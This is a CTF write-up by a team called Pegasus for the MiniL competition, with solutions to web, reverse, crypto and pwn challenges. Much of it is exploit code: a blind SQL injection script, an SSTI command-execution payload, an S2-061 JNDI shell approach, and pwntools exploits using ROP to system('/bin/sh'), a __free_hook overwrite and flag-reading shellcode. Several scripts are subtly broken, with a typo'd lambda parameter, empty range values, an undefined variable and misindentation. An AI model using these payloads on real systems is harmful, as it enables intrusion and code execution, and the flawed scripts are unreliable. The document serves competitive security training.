# Team Pegasus Writeup for MiniL

members: Ghost1032, M1nJH,DX3906,Polarnova

## Web

Ghost1032

### Checkin

padding oracle attack  

脚本https://github.com/pollev/padbuster_python  

### mini_sql

过滤union,and,or,select,#,单引号，没有过滤\，注释符用;%00替代  

先盲注出版本8.0.26,搜到此版本新特性table可以用来注入  

脚本:  

```python
import requests
from binascii import b2a_hex

burp0_url = "http://47.93.215.154:10000/login.php"
burp0_cookies = {"PHPSESSID": "12567069cb78821b6d1b1fd3521c83bb"}
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://47.93.215.154:10000", "Content-Type": "application/x-www-form-urlencoded",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://47.93.215.154:10000/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}


def get_len():
    for i in range(0, 100):
        payload = "length(id)={}".format(i)
        burp0_data = {"username": "admin\\", "password": "|| "+payload+";\x00"}
        r = requests.post(burp0_url, headers=burp0_headers,
                          cookies=burp0_cookies, data=burp0_data)
        print(r.text)
        if 'success' in r.text:
            print(payload)
            break


def get_username():
    result = ''
    # total length is 19
    # enum from 1 to 19
    for i in range(1, 20):
        for j in range(32, 129):
            payload = "ascii(mid(username,{},1))={}".format(i, j)
            burp0_data = {"username": "admin\\",
                          "password": "|| "+payload+";\x00"}
            r = requests.post(burp0_url, headers=burp0_headers,
                              cookies=burp0_cookies, data=burp0_data)
            if 'success' in r.text:
                result += chr(j)
                print(result)
                break


def get_hex(i: str):
    # input : 'a'
    # output: '0x61'
    return str(b2a_hex(i.encode("utf8")))[2:-1]


def get_password():
    result = ''
    # dic: a-z,0-9
    dic = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q',
           'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', ]
    rec = 0
    while True:
        flag = 0
        for i in range(len(dic)):
            temp = result + dic[i]
            payload = "((1,0x77336c63306d655f74305f6d316e316c637435,0x{})<(table users limit 1))".format(
                get_hex(temp))
            # print(payload)
            burp0_data = {"username": "admin\\",
                          "password": "|| "+payload+";\x00"}
            r = requests.post(burp0_url, headers=burp0_headers,
                              cookies=burp0_cookies, data=burp0_data)
            if 'fail' in r.text:
                result += dic[i-1]
                rec = i
                flag = 1
                print(result)
                break
        if flag == 0:
            li = [i for i in result]
            li[len(li)-1] = dic[rec]
            print("Final result: " + "".join(li))
            break
get_password()
```

### mini_springboot

见https://www.cnpanda.net/sec/1063.html  

有过滤，但全转为url编码可绕过  

预期解为用ProcessBuilder  

\_\_${New java.lang.ProcessBuilder(New String[]{"bash", "-c", "whoami"}).start()}\_\_: : .x  

### mini Struts2

审计代码，有S2-061  

先/login.action随便登录一下  

/index.action处传payload  

过滤exec和Unicode绕过  

考虑用Jndi  

见https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/Struts2%20s2-061%20Poc%20(CVE-2020-17530).md  

起个rmi弹shell  

## include

真丶签到  

token用base64解码，改内容为Lteam再代回去  

传个一句话连接antsword  

## Reverse

DX3906

### not RC4

- RISC-V 逆向，有找到ida的插件，但装上一直报错，放弃

- 又找到`Ghidra`，反编译很丑但能用，使劲看发现是个vm

- 大致流程及指令

```c
0
0xf1                6
LAB_00100b7e        8

{
  int i;

  for (i = 0; i < 4; i ++) {
    if (&enc_flag[i]) != check_array[i]) {      //longlong
      printf("Wrong!");
      exit(0);
    }
  }
  op_pointer++;
  return;
}




0xf2                10
LAB_00100bfe        12

{
  if (key_num_2 < opcode[op_pointer + 2]) {//0x0b
    op_pointer -= opcode[op_pointer + 1];//4
    key_num_2 ++;
  }
  else {
    key_num_2 = 0;
    op_pointer += 3;
  }
  return;
}




0xf3                14
LAB_00100974        16

key_const_1 = 0x0000000064627421;
key_const_2 = 0x0000000079796473;
{
  left_8_bytes = input_left_8_bytes +  key_const_1;
  right_8_bytes = input_right_8_bytes + key_const_2;
  op_pointer += 2;
  return;
}




0xf4                18
LAB_00100a10        20

{
  if (opcode[op_pointer + 1] == 0xe1) {
    left_8_bytes = key_const_1 + ((right_8_bytes ^ left_8_bytes) >> (-right_8_bytes & 0x3f) | (right_8_bytes ^ left_8_bytes) << (right_8_bytes & 0x3fU));
    left_8_bytes = key_const_1 + rol(right_8_bytes ^ left_8_bytes, 6);
  }
  if (opcode[*op_pointer + 1] == 0xe2) {
    right_8_bytes = key_const_2 + ((right_8_bytes ^ left_8_bytes) >> (-left_8_bytes & 0x3f) | (right_8_bytes ^ left_8_bytes) << (left_8_bytes & 0x3f));
  }
  op_pointer += 2;
  return;
}

void RC5_ENCRYPT(WORD *pt, WORD *ct)
{
   WORD i, A = pt[0] + S[0], B = pt[1] + S[1];

   for(i = 1; i <= r; i++)
   {
      A = ROTL(A ^ B, B) + S[2*i];
      B = ROTL(B ^ A, A) + S[2*i + 1];
   }
   ct[0] = A; ct[1] = B;
}



(val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))


0xf5                22
LAB_00100af0        24

{
  *(undefined8 *)(&check_array + (longlong)key_num_1 * 8) = left_8_bytes;
  *(undefined8 *)(&check_array + (longlong)(key_num_1 + 1) * 8) = right_8_bytes;
  left_8_bytes = 0;
  right_8_bytes = 0;
  key_num_1 += 2;
  op_pointer++;
  return;
}


opcode = { 0xf3, 0x00, 0xf4, 0xe1, 0xf4, 0xe2, 0xf2, 0x04, 0x0b, 0xf5,       0xf3, 0x02, 0xf4, 0xe1, 0xf4, 0xe2, 0xf2, 0x04, 0x0b, 0xf5, 0xf1, 0xff }


enc_flag = { 0xca, 0x82, 0xef, 0x95, 0xbb, 0x1d, 0xc2, 0x4b, 0xbe, 0x47, 0xb5, 0x71, 0xae, 0xec, 0x7b, 0xf5, 0xcd, 0xf6, 0xe7, 0x15, 0xab, 0xbd, 0xa1, 0x80, 0x85, 0x63, 0x77, 0xe1, 0xd7, 0x93, 0xc7, 0xa3 }
```

- 最后得知整个流程是个去掉了初始化的`RC5`（not RC4就在这

- exp

```python
from Crypto.Util.number import *
enc_flag = [0x4bc21dbb95ef82ca, 0xf57becae71b547be, 0x80a1bdab15e7f6cd, 0xa3c793d7e1776385]

key_const_1 = 0x0000000064627421
key_const_2 = 0x0000000079796473

rol = lambda val, r_bts, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

left_8_bytes = 0x4bc21dbb95ef82ca
right_8_bytes = 0xf57becae71b547be

for j in range(12):

    right_8_bytes = ror((right_8_bytes - key_const_2), left_8_bytes, 64) ^ left_8_bytes
    left_8_bytes = ror((left_8_bytes - key_const_1), right_8_bytes,64) ^ right_8_bytes

left_8_bytes -= key_const_1
right_8_bytes -= key_const_2

print(long_to_bytes(left_8_bytes), long_to_bytes(right_8_bytes))
```

- 字节序问题，最后要逆过来看

- flag`miniLCTF{I_hate_U_r1sc-V!}`

### lemon

- lemon语言逆向，给了一段字节码

- 吐槽一下官方仓库readme写得太简略了，费了好大劲才搞懂工具怎么用

- 然后就是体力活了

- 猜一下，写点代码，`\dis`一下，和题目文件比对一下，还原原代码

- 突然发现最后代码没存（（（，可能是出了之后太激动直接没保存就把vscode扬了（（

- 还原出来的代码直接运行会输出一个列表

```python
flag = [109, 105, 110, 105, 76, 99, 116, 102, 123, 108, 51, 109, 48, 110, 95, 49, 115, 95, 115,32, 95, 115, 48, 117, 114, 114, 82, 55, 55, 82, 114, 114, 82, 55, 125]
```

- 输出一下，中间还有一个迷之数据，具体是啥忘了，就是上面的`32`（下面空格）那一位

- `miniLctf{l3m0n_1s_s _s0urrR77RrrR7}`

- 盲猜是`0`对了

- flag`miniLctf{l3m0n_1s_s0_s0urrR77RrrR7}`

## Crypto

Polarnova

### DoubleS

最简单的解方程组

```python
from Crypto.Util.number import bytes_to_long,long_to_bytes
from sage.all import *
f=open("./outputs","r")

M=[]
a=[]
b=[]
reader=f.readlines()
for i in range(len(reader)):
    reader[i]=reader[i].strip().split()
    a.append(bytes_to_long(reader[i][0].encode()))
    b.append(int(reader[i][1]))
f.close()
for i in range(len(a)):
    temp=[]
    for j in range(len(a)):
        temp.append(a[i]**j)
    M.append(temp)
M=Matrix(ZZ,M)
x=M.solve_right(b)
print("".join([long_to_bytes(int(x[i])).decode() for i in range(11)]))
```

### DoubleSS

相比于第一题少了一个方程，但是我们知道`flag`第一位是个`#`

```python
#...(data preproccess same as DoubleS)
M=Matrix(ZZ,M)
f0=Matrix(ZZ,M.solve_right(vector(b)).list())
f=M.right_kernel().basis_matrix()
x=((((ord('#')*2**24)-f0[0][0])//f[0][0]+1)*f+f0).list()
flag=b''
for i in range(len(x)):
    flag=flag+long_to_bytes(x[i])
print(flag)
```

### DoubleSS_revenge

在$\Z_p$上做,可以轻轻爆一下

```python
#...(data preproccess same as DoubleS)
mint=bytes_to_long(b'!!!!')
maxt=bytes_to_long(b'zzzz')

f0inv=inverse_mod(f[0][0],prime)
f0invf00=f0inv*f0[0][0]
for i1 in table:
    for i2 in table:
        for i3 in table:
            s="#"+i1+i2+i3
            k=(f0inv*bytes_to_long(s.encode())-f0invf00)%prime
            t2=k*f[0][1]+f0[0][1]
            if (mint<=t<=maxt):
                x=[(f[0][i]*k+f0[0][i])%prime for i in range(len(f[0]))]
                print(x)
                break
```

### CoPiano

题目名字看起来要用coppersmith，但是可以不用哈哈哈哈

```python
from Crypto.Util.number import long_to_bytes, bytes_to_long
from gmpy2 import iroot

file=open("./output","rb")
reader=file.readlines()
file.close()
N=int(reader[0][3:-1].decode())
e=int(reader[1][3:-1].decode())
c=reader[2][3:]+reader[3][:-1]
x_list =[89599996522125494728132065796081314888810950095181744512992356094917495827443, 111979904109756127394693679024647005275390867856812731994635347988900596298901, 106209012329777910330837000863123340116235602175776978549841304856845930037121, 18173721445537427668177128539415608714155641511817069640781972116265623529623, 81507795317783462067383199855617452525104003153691291402800284746422706616929, 33854282304827101977159638930122849867940456079942035936413397560316807528057]
t_list =[30759544486063570688860219879387102783547151285697461243698476828942537859168, 45684268045908628534389489460421258486103756929759619145835441239375997050885, 47153891839807896976831212745370875626929694348851552426519136773945719614976, 14540075752480743007439285282769614519129399754512051542462921184787579281415, 14532773489254802771844322584435345295138446685678524359091428883876727759457, 33499974240730319678796819208752236675597746143166267811713245828429274677248]
cipher_block_length=256

cipher_block = [bytes_to_long(c[cipher_block_length * i: cipher_block_length * (i + 1)]) for i in range(len(c) // cipher_block_length)]
msgxorrand=[]
for m3 in cipher_block:
    for i in range(10):
        temp=m3+i*N
        roott=iroot(temp,e)
        if(roott[1]):
            msgxorrand.append(roott[0])
        break

msg=[x_list[i]^msgxorrand[i] for i in range(len(msgxorrand))]
flag=[long_to_bytes(msg[i]) for i in range(len(msg))]
flag=b''.join(flag)
```

### factorchal

检验非酋的题捏，啊原来非酋是我啊，21%还跑了巨多次（如果每次跑足5min，概率大约为50%）

注意到题目中$d=pk$的$k$是素数，于是我们打素数表爆$k$

```python
from pwn import *
import string
from hashlib import sha256
from math import gcd
from Crypto.Util.number import inverse,isPrime

table = string.ascii_letters+string.digits

def proof_of_work(sh,s,tsha):
    for i in table:
        for j in table:
            for k in table:
                for l in table:
                    proof=i+j+k+l+s
                    if(sha256(proof.encode()).hexdigest()==tsha):
                        sh.sendline((i+j+k+l).encode())
                       return

def work():
    sh=remote(IP,port)
    pres=sh.recvuntil(b'sha256(XXXX+',drop=True)
    s=sh.recvuntil(b') == ',drop=True).decode()
    tsha=sh.recvuntil(b'\n',drop=True).decode()

    proof_of_work(sh,s,tsha)
    #sh.interactive()
    pres=sh.recvuntil(b'e = ',drop=True).decode()
    e=sh.recvuntil(b'\n',drop=True).decode()
    pres=sh.recvuntil(b'n = ',drop=True).decode()
    n=sh.recvuntil(b'\n',drop=True).decode()
    pres=sh.recvuntil(b'c = ',drop=True).decode()
    c=sh.recvuntil(b'\n',drop=True).decode()

    e=int(e,16)
    n=int(n,16)
    c=int(c,16)

    p=-1

    e_2=pow(2,e,n)
    for k in primes:
        temp=pow(e_2,k,n)-2
        if(gcd(temp,n)!=1):
            p=gcd(temp,n)
            break
    if(p==-1):
        sh.close()
        return 0

    q=n//p
    phi=(p-1)*(q-1)
    d=inverse(e,phi)
    m=pow(c,d,n)

    sh.sendline(hex(m).encode())
    sh.interactive()
    return 1

primes=[]
maxp=
minp=
#guess range of k, we can use Li(x) to cal P(success)
for i in range(maxp,minp):#can be sub a better sieve
    if(isPrime(i)):
        primes.append(i)
work()#每次跑完一遍以后如果失败或者刷新环境让其重新生成k，或者改变k的范围
```

## Pwn

M1nJH

### gods

main函数通过`pthread_create`创建一个线程来执行`vuln`函数，vuln函数中可以进行如下操作：

```c
while ( edit_times > 0 )
  {
    puts("Add new god:");
    printf("Rank: ");
    __isoc99_scanf("%hd", &v2);
    if ( v2 <= 1u )
    {
      puts("Damn, I'm angry!");
      exit(0);
    }
    printf("Name: ");
    __isoc99_scanf("%7s", &v5);
    v4[v2 - 1] = v5;
    puts("\n## List of Gods ##");
    for ( i = 0; i <= 2; ++i )
      printf("%d. %s\n", (unsigned int)(i + 1), (const char *)&v4[i]);
    puts(&byte_4020E0);
    --edit_times;
  }
  puts("Finally, what's your name?");
  __isoc99_scanf("%72s", v6);
  printf("Oh dear '%s', I hope one day you can be a god of XDSEC!\n", (const char *)v6);
```

- 可以两次向栈上任意高地址写入7个字符
- 可以进行一次溢出，共写入72个字符

由于本题存在canary，但是通过`pthread_create`创建线程，同时可以向任意高地址处写入7个字符，故可以直接覆盖高地址处的TLS结构体，修改canary的值，绕过canary校验

```python
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
#p = process('./gods')
p = remote('pwn.archive.xdsec.chall.frankli.site',10011)
elf = ELF('./gods')
libc = ELF('./libc-2.31.so')

puts_plt = elf.plt['puts']
#puts_plt = b'\xd4\x10@\x00\x00\x00\x00'
puts_got = elf.got['puts']
pop_rdi = 0x4015D3
bss = b' @@\x00\x00\x00\x00'
ret = b'-\x14@\x00\x00\x00\x00'


p.recv()
p.sendline('yes')
p.recvuntil('Rank: ')
p.sendline('272')
p.recvuntil('Name: ')
p.sendline('aaaaaaa')

p.recvuntil('Rank: ')
p.sendline('2')
p.recvuntil('Name: ')
p.sendline('aa')

p.recv()
payload = b'k'*24 + b'aaaaaaa\x00' + p64(0xdeadbeef) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x401236)
p.sendline(payload)
p.recvuntil('XDSEC!\n')
#print(p.recv(6))
libc_addr = u64(p.recv(6).ljust(8,b'\x00')) - libc.symbols['puts']
#libc_addr = u64(p.recv(6).ljust(8,b'\x00'))
print(hex(libc_addr))

system = libc_addr + libc.symbols["system"]
bin_sh = libc_addr + next(libc.search(b"/bin/sh"))
#gdb.attach(p)
payload = b'k'*24 + b'aaaaaaa\x00' + p64(0xdeadbeef) + p64(0x4015D4) + p64(0x4015d3) + p64(bin_sh) + p64(system) 
p.sendline(payload)

p.interactive()
```

### bugs

```python
from pwn import *

context.log_level = "debug"
context.binary = "./bugged_interpreter"

'''
typedef enum {
    NOOP    = 0,
    IADD    = 1,   // int add
    ISUB    = 2,
    IMUL    = 3,
    ILT     = 4,   // int less than
    IEQ     = 5,   // int equal
    BR      = 6,   // branch
    BRT     = 7,   // branch if true
    BRF     = 8,   // branch if true
    ICONST  = 9,   // push constant integer
    LOAD    = 10,  // load from local context
    GLOAD   = 11,  // load from global memory
    STORE   = 12,  // store in local context
    GSTORE  = 13,  // store in global memory
    PRINT   = 14,  // print stack top
    POP     = 15,  // throw away top of stack
    CALL    = 16,  // call function at address with nargs,nlocals
    RET     = 17,  // return value from function
    HALT    = 18
} VM_CODE;
'''

p = process("./bugged_interpreter")
#p = remote('pwn.archive.xdsec.chall.frankli.site',10061)
libc=ELF('./libc-2.31.so')
# opcode
GSTORE = 13 # gstore, offset
POP = 15    # pop
GLOAD = 11  # gload, offset
LOAD = 10   # load, offset
STORE = 12  # store, offset
PUSH = ICONST = 9 # push, data
ADD = IADD = 1 # add
HALT = 18
#gdb.attach(p,"b* $rebase(0x1C18)")
#pause()
code=p32(PUSH)+p32(0)
#read code ptr to the vm stack
code+=p32(STORE)+p32(0) + p32(STORE)+p32(1)
code+=p32(STORE)+p32(2) + p32(STORE)+p32(3)
code+=p32(STORE)+p32(4) + p32(STORE)+p32(5)
code+=p32(STORE)+p32(6) + p32(STORE)+p32(7)
code+=p32(LOAD)+p32(7) + p32(LOAD)+p32(6)
code+=p32(LOAD)+p32(5) + p32(LOAD)+p32(4)
code+=p32(LOAD)+p32(7) + p32(LOAD)+p32(6)
code+=p32(LOAD)+p32(1) + p32(LOAD)+p32(0)

# read libc address into vm stack
code += p32(GLOAD) + p32(0x87)
code += p32(GLOAD) + p32(0x86)

# calc system addres
code += p32(PUSH) + p32(libc.sym['system']-libc.sym['__libc_start_main']-205)
code += p32(ADD)

# read libc address into vm stack
code += p32(GLOAD) + p32(0x87)
code += p32(GLOAD) + p32(0x86)

# calc __free_hook_address
code += p32(PUSH) + p32(libc.sym['__free_hook']-libc.sym['__libc_start_main']-205-8)
code += p32(ADD)

#push /bin/sh\x00 
code += p32(PUSH) + p32(0x6e69622f)
code += p32(PUSH) + p32(0x68732f)
code+=p32(STORE)+p32(5) + p32(STORE)+p32(4)
code+=p32(STORE)+p32(3) + p32(STORE)+p32(2)
code+=p32(STORE)+p32(1) + p32(STORE)+p32(0)

#write /bin/sh\x00 -------> free_hook-8
code+= p32(POP) + p32(POP) + p32(POP) + p32(POP) 
code+=p32(LOAD)+p32(3) + p32(LOAD)+p32(2)
code+=p32(LOAD)+p32(1) + p32(LOAD)+p32(0)

# write free_hook -------> system
code += p32(GSTORE) + p32(3)
code += p32(GSTORE) + p32(2)

code+=p32(LOAD)+p32(4) + p32(LOAD)+p32(5)
# write /bin/sh\x00 on the free_hook-8
code += p32(GSTORE) + p32(1)
code += p32(GSTORE) + p32(0)
code += p32(PUSH)+p32(0) + p32(PUSH)+p32(0)

# jump to vm_free
code += p32(HALT)

code = code.ljust(512, b"\x00")

p.send(code)
p.interactive()
```

### shellcode

```python
from pwn import *
context.log_level = "debug"

#p = process('./shellcode')
p = remote('pwn.archive.xdsec.chall.frankli.site',10011)

append = '''
push rdx
pop rdx
'''

mmap = '''
mov rdi,0x40404040;
mov rsi,0xff;
mov rdx,7;
mov rcx,34;
mov r8,0;
mov r9,0;
mov rax,9;
syscall;
'''

shellcode_read =  '''
mov rdi,0;
mov rsi,0x40404040;
mov rdx,0x1010;
mov rax,0;
syscall;
'''

to32 = '''
push 0x23;
push 0x40404040;
retfq;
'''

open_flag = '''
/*fp = open("flag")*/
mov esp,0x40404140
push 0x67616c66
push esp
pop ebx
xor ecx,ecx
mov eax,5
int 0x80
mov ecx,eax
'''

shellcode_flag = '''
push 0x33
push 0x40404089
retfq
/*read(fp,buf,0x70)*/
mov rdi,rcx
mov rsi,rsp
mov rdx,0x70
xor rax,rax
syscall

/*write(1,buf,0x70)*/
mov rdi,1
mov rax,1
syscall
'''
shellcode_flag = asm(shellcode_flag,arch = 'amd64',os = 'linux')

#gdb.attach(p,"b* $rebase(0x137D)")

sh = mmap + append + shellcode_read + append + to32 + append
sh = asm(sh,arch = 'amd64',os = 'linux')
p.sendline(sh)
pause()
sh = asm(open_flag) + 0x29*b'\x90' + shellcode_flag
p.sendline(sh)

p.interactive()
```

### httpd

```python
import requests
#from pwn import *

header = {
    "User-Agent": "MiniL"
}
host = "http://127.0.0.1:2048"
end = r"/home/minil/flag"
url = ''.join([host,end])
res = requests.get(url, headers=header)
print(res)
```
